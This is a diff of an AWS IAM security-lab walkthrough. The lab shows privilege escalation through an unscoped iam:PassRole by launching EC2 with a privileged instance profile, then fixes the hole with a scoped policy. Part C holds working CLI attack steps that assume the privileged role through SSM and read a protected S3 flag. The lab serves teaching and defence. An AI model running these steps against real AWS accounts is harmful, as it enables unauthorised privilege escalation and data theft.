@@ -6,7 +6,7 @@
 
 **The Vulnerability:** `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission has `Resource: "*"` and no `iam:PassedToService` condition. Without this condition, PassRole works for any AWS service — including EC2 — and any role, including privileged ones.
 
-**Real-world scenario:** A CI/CD pipeline user needs `iam:PassRole` to deploy Lambda functions and has separate EC2 permissions for build infrastructure. Without `iam:PassedToService`, PassRole isn't scoped to Lambda — it works for all services. The attacker exploits this gap by passing a privileged role to EC2 instead.
+**Real-world scenario:** A deployer principal has `iam:PassRole` so it can hand Lambda functions their execution roles at deploy time, plus `ec2:RunInstances` for spinning up build and dev infrastructure — a normal-looking combination. The PassRole statement was copy-pasted from a Stack Overflow answer or AWS docs example that didn't include the `iam:PassedToService` condition. Without that condition, PassRole isn't actually scoped to Lambda — it works for any AWS service. The attacker passes a privileged role to EC2 instead, launches an instance with it attached, and reads the role's credentials off the instance metadata service.
 
 > [!NOTE]
 > **EC2 + PassRole primer:** An EC2 *instance profile* is the mechanism for attaching an IAM role to a virtual machine. The instance retrieves temporary credentials for that role from the metadata service (`169.254.169.254`), so any workload running on the instance can call AWS APIs as that role. `iam:PassRole` is the gatekeeper that controls which roles a user can hand off to AWS services like EC2 and Lambda.
@@ -16,22 +16,18 @@
 Build or refresh your iam-recon graph:
 
 ```bash
-iam-recon graph create --profile taractf
+iam-recon graph create --profile iamws-lab-default
 ```
 
-Run the privilege escalation preset — this scenario's EC2 edge IS visible here:
+Run the privilege escalation preset scoped to this scenario's principal — this scenario's EC2 edge IS visible here:
 
 ```bash
-iam-recon --account $ACCOUNT_ID argquery --preset privesc
+iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
 ```
 
-Expected output (relevant excerpt):
+Expected output:
 ```
-──────────────────────────────
-  Privilege Escalation Paths
-──────────────────────────────
-
-  >>> user/iamws-ci-runner-user can escalate to admin:
+  user/iamws-ci-runner-user can escalate to admin:
     user/iamws-ci-runner-user -> EC2 role/iamws-prod-deploy-role
 ```
 
@@ -50,21 +46,25 @@ Expected output:
 ALLOW user/iamws-ci-runner-user can call iam:PassRole with *
 ```
 
-Cross-reference with pathfinding.cloud:
+Cross-reference with pathfinding.cloud — scoped to this principal:
 
 ```bash
-iam-recon --account $ACCOUNT_ID pathfinding
+iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-ci-runner-user
 ```
 
-Look for the `[ec2-001]` entry:
+Expected output:
 ```
-[ec2-001] user/iamws-ci-runner-user (new-passrole)
-    Path: iam:PassRole + ec2:RunInstances
-    Perms: iam:PassRole, ec2:RunInstances
+Pathfinding.cloud
+  Database: N known escalation paths bundled
+
+  user/iamws-ci-runner-user — 1 paths matched:
+
+  [ec2-001] PassRole + RunInstances (new-passrole)
+    Permissions: iam:PassRole, ec2:RunInstances
     https://www.pathfinding.cloud/paths/ec2-001
 ```
 
-**In the interactive visualization:** search for `ci-runner-user`. The node is orange (Privesc). Click the **EC2** edge to the `iamws-prod-deploy-role` node — iam-recon displays the policy inline, showing the PassRole statement with `Resource: "*"` and no `Condition` block.
+**In the interactive visualization:** search for `ci-runner-user`. The node is orange with a path to the `iamws-prod-deploy-role` node in read. Click the `ci-runner-user` user. Click the `iamws-ci-runner-policy` annotated with 1 risk. `iam-recon` highlights that this policy has an unscoped `iam:PassRole` permission.
 
 ### Part B: Understand the Attack
 
@@ -75,16 +75,24 @@ Visit [pathfinding.cloud/paths/ec2-001](https://pathfinding.cloud/paths/ec2-001)
 - **Root cause:** Missing `iam:PassedToService` condition key
 - **Impact:** Access to any role that has an instance profile
 
-PassRole attacks are indirect — the attacker doesn't directly become the role. They hand it to a compute service that exposes the credentials. The fix is scoping the handoff to the intended service.
+PassRole attacks are indirect — the attacker doesn't directly become the role. They hand it to a compute service that exposes the credentials. One mitigation is scoping the handoff to the intended service only.
 
 ### Part C: Exploit the Vulnerability
 
 **Step 1: Try the crown jewels — you're denied**
 
+First, confirm that `iamws-ci-runner-user` cannot access the crown jewels bucket directly. This establishes the baseline: S3 access is denied, so any access you gain later comes entirely from the PassRole exploit — not from pre-existing S3 permissions.
+
+Set your account ID:
+
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
   --profile iamws-ci-runner-user)
+```
 
+Attempt to access the crown jewels — expect a 403:
+
+```bash
 aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
   --profile iamws-ci-runner-user
 ```
@@ -94,24 +102,9 @@ Expected output:
 fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
 ```
 
-**Step 2: Inspect the vulnerable PassRole policy**
+**Step 2: Find a suitable AMI**
 
-> [!NOTE]
-> `iamws-ci-runner-user` does not have `iam:GetPolicyVersion` — this command must run as an admin (e.g., `taractf`). The policy contents are also shown in the slide.
-
-```bash
-aws iam get-policy-version \
-  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
-  --version-id v1 --query 'PolicyVersion.Document' --output json \
-  --profile taractf
-```
-
-Notice the PassRole statement has `Resource: "*"` and **no Condition block**. The missing condition is:
-```json
-"Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}
-```
-
-**Step 3: Find a suitable AMI and subnet**
+To launch an EC2 instance you need two things: a machine image (AMI) to boot from, and a subnet to place it in. The command below finds the latest Amazon Linux 2 AMI — a lightweight, AWS-maintained image that comes with the SSM agent pre-installed, which you'll use in a later step to connect to the instance without needing SSH or a key pair.
 
 ```bash
 AMI_ID=$(aws ec2 describe-images \
@@ -120,15 +113,25 @@ AMI_ID=$(aws ec2 describe-images \
   --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text \
   --profile iamws-ci-runner-user)
 
+echo "AMI: $AMI_ID"
+```
+
+**Step 3: Find a suitable subnet**
+
+EC2 also needs to know which VPC subnet to place the instance in. This grabs the default subnet so you don't need any prior knowledge of the account's network topology.
+
+```bash
 SUBNET_ID=$(aws ec2 describe-subnets \
   --filters "Name=default-for-az,Values=true" \
   --query 'Subnets[0].SubnetId' --output text \
   --profile iamws-ci-runner-user)
 
-echo "AMI: $AMI_ID  Subnet: $SUBNET_ID"
+echo "Subnet: $SUBNET_ID"
 ```
 
 **Step 4: Launch EC2 with the privileged instance profile**
+
+This is the exploit. The `--iam-instance-profile Name=iamws-prod-deploy-profile` flag is what exercises `iam:PassRole` — you're handing the privileged `iamws-prod-deploy-role` to EC2 instead of the intended Lambda service. Because `iamws-ci-runner-user` has no `iam:PassedToService` condition on its PassRole permission, AWS accepts this without complaint.
 
 ```bash
 INSTANCE_ID=$(aws ec2 run-instances \
@@ -145,39 +148,66 @@ No error — unrestricted PassRole let us attach the privileged `iamws-prod-depl
 
 **Step 5: Wait for the SSM agent to register (~90 seconds)**
 
+Instead of SSH, you'll use AWS Systems Manager (SSM) Session Manager to connect to the instance. SSM lets you open a shell without key pairs or open inbound ports — the instance's SSM agent initiates an outbound connection to the SSM service and registers itself. You need to wait for that registration before you can open a session.
+
 > [!NOTE]
-> `iamws-ci-runner-user` lacks `ssm:DescribeInstanceInformation` — poll the agent status as `taractf`.
+> `iamws-ci-runner-user` lacks `ssm:DescribeInstanceInformation`, so you check the agent status using `iamws-lab-default` (your admin identity). You'll connect to the session itself as `iamws-ci-runner-user` in the next step.
+
+Wait 90 seconds for the agent to register:
 
 ```bash
 sleep 90
+```
+
+Check that the agent is online:
+
+```bash
 aws ssm describe-instance-information \
   --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
   --query 'InstanceInformationList[0].PingStatus' --output text \
-  --profile taractf
+  --profile iamws-lab-default
 ```
 
 Expected output: `Online`. If blank, wait a bit longer and retry.
 
-**Step 6: Start an SSM session and claim the crown jewels**
+**Step 6: Start an SSM session**
 
-This step is interactive — run it from your terminal:
+This step is interactive — run it from your terminal. Once inside the shell, any AWS API calls automatically use the instance's attached role (`iamws-prod-deploy-role`) via the EC2 metadata service — not your `iamws-ci-runner-user` credentials.
 
 ```bash
 aws ssm start-session --target $INSTANCE_ID \
   --profile iamws-ci-runner-user
 ```
 
-Inside the session, run the following commands:
+**Step 7: Claim the crown jewels from inside the session**
+
+You're now operating as the privileged role. Verify the identity:
 
 ```bash
-# Inside the SSM session:
-aws sts get-caller-identity                        # shows iamws-prod-deploy-role
+aws sts get-caller-identity
+```
+
+Expected output shows `iamws-prod-deploy-role` — the instance assumed the privileged role.
+
+Capture your account ID (the instance credentials have no `--profile` flag — they come from the metadata service):
+
+```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+```
+
+Access the crown jewels:
+
+```bash
 aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
+```
+
+Exit the session:
+
+```bash
 exit
 ```
 
-The identity shows `iamws-prod-deploy-role` — the instance assumed the privileged role. The crown jewels are accessible from inside the instance.
+The crown jewels are accessible from inside the instance.
 
 > [!NOTE]
 > A real attacker wouldn't stop here. They could exfiltrate the instance's temporary credentials via the metadata service at `169.254.169.254`, use them from any machine, or create a persistent IAM user — all without logging into the instance interactively.
@@ -188,9 +218,19 @@ Run all defense steps as your admin identity.
 
 **Step 1: Apply a scoped inline policy**
 
+You're adding this as an inline policy rather than updating the shared managed policy (`iamws-ci-runner-policy`). Inline policies are scoped to a single principal, so this change lands immediately on this user without touching `iamws-ci-runner-role`, which shares the managed policy.
+
+The policy has two statements. The first rewrites PassRole with three simultaneous constraints — Action, Resource, and Condition. The second preserves the EC2 permissions the CI runner needs for build infrastructure. Before you run it, notice the Resource in Statement 1: `iamws-ci-runner-role` is the CI runner's own role — the one it's authorized to hand off, not a privileged role like `iamws-prod-deploy-role`. Scoping to a specific ARN instead of `*` is what ensures the user can't pass arbitrary roles.
+
+Set your account ID (needed to scope the role ARN in the policy document):
+
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+```
 
+Apply the inline policy:
+
+```bash
 aws iam put-user-policy \
   --user-name iamws-ci-runner-user \
   --policy-name SecurePassRole \
@@ -215,9 +255,20 @@ aws iam put-user-policy \
   }'
 ```
 
-Three restrictions now lock down PassRole — Action limited to `iam:PassRole`, Resource scoped to the CI runner's own role (not `*`), and Condition limited to `lambda.amazonaws.com`. All three must be satisfied.
+**What each statement does:**
+
+`AllowPassRoleToLambdaOnly` has three constraints that must all match simultaneously for the allow to fire:
+- **Action: `iam:PassRole`** — this specific action only, not `iam:*`
+- **Resource: `iamws-ci-runner-role`** — only the CI runner's own role; if the user tries to pass `iamws-prod-deploy-role` or any other role, this statement doesn't apply
+- **Condition: `iam:PassedToService: lambda.amazonaws.com`** — only when the destination is Lambda; an `ec2:RunInstances` call with a `--iam-instance-profile` flag targets EC2, not Lambda, so this condition fails and the statement is a no-op
+
+If any one of the three doesn't match, the statement produces no allow.
+
+`AllowEC2Operations` preserves the EC2 permissions the CI runner uses legitimately. You might wonder: if `ec2:RunInstances` was half of the original attack, why keep it? Because the attack required *both* `ec2:RunInstances` and an unconstrained `iam:PassRole` at the same time. The first statement has now locked down PassRole — `ec2:RunInstances` alone cannot complete the exploit.
 
 **Step 2: Detach the overly-permissive managed policy**
+
+The inline policy from Step 1 restricts PassRole, but IAM evaluates all attached policies together and grants access if any one allows it. The original managed policy still has an unrestricted PassRole — leaving it attached would make the new inline policy pointless. You must remove the old policy to actually close the gap.
 
 ```bash
 aws iam detach-user-policy \
@@ -255,28 +306,26 @@ aws iam simulate-principal-policy \
 
 Expected output: `"implicitDeny"` — the EC2 PassRole path is blocked.
 
-**Step 2: Confirm the crown jewels are still safe**
-
-```bash
-aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
-  --profile iamws-ci-runner-user
-```
-
-Expected output:
-```
-fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
-```
-
 **Step 3: Verify with iam-recon**
 
 Refresh the graph:
 
 ```bash
-iam-recon graph create --profile taractf
-iam-recon --account $ACCOUNT_ID argquery --preset privesc
+iam-recon graph create --profile iamws-lab-default
 ```
 
-The `user/iamws-ci-runner-user -> EC2 role/iamws-prod-deploy-role` line is gone. iam-recon's EC2 edge checker correctly evaluates `iam:PassedToService`.
+Re-run the privilege escalation preset scoped to this principal:
+
+```bash
+iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
+```
+
+Expected output:
+```
+  user/iamws-ci-runner-user cannot escalate to admin.
+```
+
+The EC2 PassRole edge to `iamws-prod-deploy-role` is gone. iam-recon's EC2 edge checker correctly evaluates `iam:PassedToService`.
 
 Confirm the specific attack permission is denied:
 
@@ -294,37 +343,28 @@ DENY user/iamws-ci-runner-user cannot call iam:PassRole with arn:aws:iam::*:role
 
 **In the interactive visualization:** search for `ci-runner-user`. The node is now blue (User). The EC2 edge to `iamws-prod-deploy-role` is gone. The `IDENTITY` panel lists `SecurePassRole` as the only policy.
 
-![Post-defense PassRole visualization](.playwright-mcp/scenario-3-postdefense-viz.png)
-
 ### Going Further
 
-The defense above scopes the **user's** permissions. The same-named **role** (`iamws-ci-runner-role`) still has the original `iamws-ci-runner-policy` attached — iam-recon's `argquery --preset privesc` still shows `role/iamws-ci-runner-role -> EC2 role/iamws-prod-deploy-role`.
+The defense above scopes the **user's** permissions. `iamws-ci-runner-role` is a sibling principal — a separate identity that shares the same vulnerable `iamws-ci-runner-policy` but has no trust relationship with `iamws-ci-runner-user`. It wasn't part of the attack path you just ran, but it carries the same misconfiguration.
 
-To eliminate that edge too, apply the same fix to the role:
+Verify the edge still exists after fixing the user — scope to the role this time:
 
 ```bash
-aws iam put-role-policy \
-  --role-name iamws-ci-runner-role \
-  --policy-name SecurePassRole \
-  --policy-document '...'   # same document as above
-
-aws iam detach-role-policy \
-  --role-name iamws-ci-runner-role \
-  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy
+iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal role/iamws-ci-runner-role
 ```
+
+Expected output:
+```
+  role/iamws-ci-runner-role can escalate to admin:
+    role/iamws-ci-runner-role -> EC2 role/iamws-prod-deploy-role
+```
+
+**Knowledge check:** How would you adapt the Part D commands to fix the role? What's the minimum that needs to change compared to what you ran in Part D?
 
 ### What You Learned
 
-- `iam:PassRole` controls which roles can be handed to AWS services like EC2 and Lambda — the missing `iam:PassedToService` condition is the root cause.
-- Without the condition, PassRole isn't scoped to the intended service — it works for any service, enabling the EC2 attack path.
-- Combine **condition keys** (`iam:PassedToService`) with **resource constraints** (specific role ARN) for defense-in-depth on PassRole.
-- `aws iam simulate-principal-policy` with `context-entries` is the right tool for verifying condition-key-based defenses.
-- Defenses applied to a user don't automatically apply to the same-named role — audit both principals.
-
-### Cleanup
-
-See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.
-
----
-
-**Next:** [Scenario 4: Lambda UpdateFunctionCode](../scenario-4-lambda-updatefunctioncode/instructions.md) — Privilege escalation via existing PassRole
+- `iam:PassRole` is the permission that lets a user hand an IAM role to an AWS service — for example, giving a Lambda function its execution role. Without constraints, that same permission lets an attacker hand *any* role to *any* service, including a privileged role to EC2.
+- The `iam:PassedToService` condition key tells AWS which service is allowed to receive the role. Without it, PassRole is a blank check — the user's intended action (Lambda deployment) and the attacker's exploit (EC2 launch) look identical to IAM.
+- Scoping both the Resource (a specific role ARN) and the Condition (a specific service) creates two independent constraints. An attacker would need to pass the exact allowed role *and* pass it to the exact allowed service — defeating either one blocks the path.
+- `aws iam simulate-principal-policy` evaluates how IAM would respond to a given API call without making a real request. The `--context-entries` flag is how you supply condition key values — like `iam:PassedToService` — that exist in a real API call but aren't present in a dry-run simulation.
+- Fixing a user's permissions doesn't fix a role's permissions, even when both have the same managed policy attached. IAM evaluates policies per-principal — if multiple principals share a vulnerable policy, you need to audit and remediate each one.
